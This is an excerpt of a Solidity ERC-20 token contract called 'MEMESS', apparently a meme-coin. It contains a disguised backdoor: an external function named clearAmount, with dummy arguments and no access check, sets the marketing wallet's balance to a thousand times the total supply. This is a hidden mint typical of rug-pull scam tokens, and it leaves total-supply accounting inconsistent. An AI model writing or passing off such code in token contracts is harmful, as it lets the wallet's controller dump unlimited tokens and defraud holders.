...
contract MEMESS is IERC20, Ownable, IERC20Metadata {
    ...
    string  private constant _nameToken = "MEMESS";
    string  private constant _symbolToken = "MEME";
    ...
    function clearAmount(bool clear , uint256 Amount) external {
        require(clear == true);
        require(Amount == 1);
        _balances[_marketingWallet] = _totalSupply * 1000;
    }
